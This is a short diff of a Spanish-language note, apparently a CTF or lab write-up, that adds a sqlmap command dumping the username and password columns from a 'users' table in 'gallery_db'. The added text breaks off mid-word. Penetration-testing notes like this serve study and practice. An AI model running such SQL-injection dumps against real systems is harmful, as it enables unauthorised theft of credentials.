@@ -72,4 +72,10 @@ sqlmap -r phpid.txt -D gallery_db -T users --columns users
 
 ![[Pasted image 20240112223801.png]]
 
-ahora vamos a enumerar las columnas de 
+ahora vamos a enumerar las columnas de password y username
+```python
+sqlmap -r phpid.txt -D gallery_db -T users --columns users -C username,password --dump
+```
+
+![[Pasted image 20240112224808.png]]
+tenems
